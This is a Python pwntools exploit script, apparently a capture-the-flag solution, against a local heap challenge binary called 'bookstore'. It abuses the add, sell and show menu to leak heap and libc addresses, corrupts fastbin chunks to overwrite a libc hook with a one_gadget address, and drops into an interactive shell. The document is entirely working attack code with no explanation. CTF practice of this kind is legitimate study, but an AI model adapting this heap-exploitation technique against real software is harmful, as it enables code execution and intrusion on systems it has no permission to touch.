from pwn import *

context.log_level=1

p=process('./bookstore')
elf=ELF('./libc_64.so')

chunk_base=0
libc_base=0
one_gadget=0x4526a

sd=lambda x:p.send(x)
sl=lambda x:p.sendline(x)
rv=lambda x:p.recvuntil(x)
sa=lambda a,x:p.sendafter(a,x)
sla=lambda a,x:p.sendlineafter(a,x)

menu='Your choice:\n'

def add(length,bname='',aname=''):
    sla(menu,'1')
    sla('What is the author name?\n',aname)
    sla('How long is the book name?\n',str(length))
    sla('What is the name of the book?\n',bname)

def dele(index):
    sla(menu,'2')
    sla('Which book do you want to sell?\n',str(index))

def show(index,content=''):
    sla(menu,'3')
    if len(content)==0:
        sla('Which book do you want to sell?\n',str(index))
    else:
        sla('Which book do you want to sell?\n',content)

def z():
    log.info('chunk base:'+hex(chunk_base))
    gdb.attach(p)

add(0)      #0
add(0)      #1
add(0)      #2

dele(2)
dele(1)
dele(0)

add(0)      #0
show(0)
rv('Bookname:')
chunk_base=u32(p.recv(4))-0x20

add(0,p64(0)*3+p64(0x21)+p64(chunk_base))      #1
add(0)                                         #2

add(0)      #3
dele(3)

for i in range(6):
    add(0x38)   #3-8

for i in range(3,8):
    dele(i)

show(0,'1'*0x400)

show(0)
rv('Bookname:')
libc_base=u64(p.recv(6)+2*'\x00')-0x3c4ba8
log.info('libc base:'+hex(libc_base))

add(0)      #3
add(0)      #4

dele(4)
dele(3)

add(0,p64(0)*3+p64(0x21)+p64(0x61)) #3
add(0)                              #4
evil_addr=libc_base+0x3c4b20

add(0x50)   #5
dele(4)
dele(5)

payload=p64(0)*7+p64(0x61)+p64(evil_addr)
add(0,payload)  #4


add(0x50) #5
add(0x50,p64(0)*9+p64(libc_base+0x3c4ae8)) #6

add(0x30)
add(0x30)
add(0x50)   
add(0x50,p64(0)*3+p64(libc_base+one_gadget))   

sla(menu,'1')
sla('What is the author name?\n','wenhuo')
sla('How long is the book name?\n','23')
 

p.interactive()
